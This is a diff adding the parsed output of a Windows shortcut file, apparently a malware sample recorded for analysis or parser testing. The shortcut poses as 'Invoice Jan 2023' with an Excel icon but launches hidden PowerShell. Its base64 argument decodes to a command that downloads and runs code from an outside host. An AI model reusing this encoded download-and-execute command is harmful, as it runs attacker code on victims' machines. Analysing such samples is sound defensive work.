@@ -1,0 +1,66 @@
+Windows Shortcut Information:
+   Link CLSID: 00021401-0000-0000-C000-000000000046
+   Link Flags: HasTargetIDList | HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16637)
+   File Flags:  - (0)
+
+   Creation Timestamp: None
+   Modified Timestamp: None
+   Accessed Timestamp: None
+
+   Icon Index: 0 
+   Window Style: SW_SHOWMINNOACTIVE 
+   HotKey: CONTROL - C {0x4302} 
+
+   TARGETS:
+      Index: 78
+      ITEMS:
+         Root Folder
+            Sort index: My Computer
+            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
+         Volume Item
+            Flags: 0xf
+            Data: None
+         File entry
+            Flags: Is directory
+            Modification time: None
+            File attribute flags: 16
+            Primary name: Windows
+         File entry
+            Flags: Is directory
+            Modification time: None
+            File attribute flags: 16
+            Primary name: System32
+         File entry
+            Flags: Is directory
+            Modification time: None
+            File attribute flags: 16
+            Primary name: WindowsPowerShell
+         File entry
+            Flags: Is directory
+            Modification time: None
+            File attribute flags: 16
+            Primary name: v1.0
+         File entry
+            Flags: Is file
+            Modification time: None
+            File attribute flags: 0
+            Primary name: powershell.exe
+
+   DATA
+      Description: Invoice Jan 2023
+      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      Working directory: C:
+      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
+      Icon location: C:\Users\Administrator\Desktop\excel.ico
+
+   EXTRA BLOCKS:
+      ICON_LOCATION_BLOCK
+         Target ansi: %USERPROFILE%\Desktop\excel.ico
+         Target unicode: %USERPROFILE%\Desktop\excel.ico
+      SPECIAL_FOLDER_LOCATION_BLOCK
+         Special folder id: 37
+      KNOWN_FOLDER_LOCATION_BLOCK
+         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
+      METADATA_PROPERTIES_BLOCK
+         Version: 0x53505331
+         Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
